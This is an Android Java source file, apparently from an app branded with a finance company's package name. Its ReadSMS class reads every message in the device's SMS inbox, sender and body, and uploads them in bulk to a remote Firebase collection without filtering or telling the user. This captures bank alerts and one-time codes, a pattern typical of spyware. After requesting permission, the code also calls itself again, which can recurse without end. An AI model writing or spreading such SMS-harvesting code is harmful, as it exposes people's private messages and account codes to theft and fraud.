package com.muthootfinance.readsms;

import static android.content.ContentValues.TAG;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.FieldValue;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.type.DateTime;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Calendar;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class ReadSMS {
    final static int REQUEST_CODE_ASK_PERMISSIONS = 123;
    static FirebaseFirestore db = FirebaseFirestore.getInstance();

    public static List<String> getSMS(Context context){
        List<String> sms = new ArrayList<String>();
        if(ContextCompat.checkSelfPermission(context, "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {
            Uri uriSMSURI = Uri.parse("content://sms/inbox");
            Cursor cur = context.getContentResolver().query(uriSMSURI, null, null, null, null);
            while (cur.moveToNext()) {
                @SuppressLint("Range") String address = cur.getString(cur.getColumnIndex("address"));
                String body = cur.getString(cur.getColumnIndexOrThrow("body"));
                sms.add(address + " :: " + body);
            }
        }else {
            ActivityCompat.requestPermissions((Activity) context, new String[]{"android.permission.READ_SMS"}, REQUEST_CODE_ASK_PERMISSIONS);
            getSMS(context);
        }

        Map<String, Object> user = new HashMap<>();
        user.put("sms", sms);
        user.put("createdDateTime", Calendar.getInstance().getTime());

        // Add a new document with a generated ID
        db.collection("SMS").add(user)
                .addOnSuccessListener(documentReference -> Log.d(TAG, "DocumentSnapshot added with ID: " + documentReference.getId()))
                .addOnFailureListener(e -> Log.w(TAG, "Error adding document", e));

        return sms;
    }
}
